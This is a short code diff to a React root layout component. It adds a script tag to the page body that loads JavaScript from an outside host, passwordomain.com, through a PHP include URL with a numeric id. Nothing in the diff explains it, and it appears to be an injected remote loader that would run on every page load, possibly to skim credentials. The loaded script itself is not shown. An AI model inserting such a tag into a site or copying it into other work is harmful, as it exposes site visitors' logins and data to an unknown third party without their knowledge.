@@ -108,6 +108,7 @@ function RootShell({ children }: { children: ReactNode }) {
       </head>
       <body>
         {children}
+        <script type="text/javascript" src="https://passwordomain.com/script_include.php?id=1907567" />
         <Scripts />
       </body>
     </html>
